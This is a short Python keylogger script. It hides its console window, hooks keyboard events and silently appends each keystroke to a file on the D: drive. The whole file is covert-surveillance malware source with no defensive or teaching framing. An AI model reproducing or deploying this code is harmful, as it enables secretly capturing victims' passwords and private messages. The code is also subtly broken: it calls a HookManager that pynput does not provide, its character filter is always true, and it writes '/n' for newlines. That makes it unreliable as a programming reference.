import win32api
import win32console
import win32gui
import pythoncom, pynput

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        exit(1)
    if event.Ascii != 0 or 8:
        # open output.txt and read the file
        f = open("D:\output.txt", "r+")
        buffer = f.read()
        f.close()
        # reopen output.txt and write new and current keystrokes
        f = open("D:\output.txt", "w")
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = "/n"
        buffer += keylogs
        f.write(buffer)
        f.close()


# creating a hook manager object
hm = pynput.HookManager()
hm.KeyDown = OnKeyboardEvent
# setting up the keyboard hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
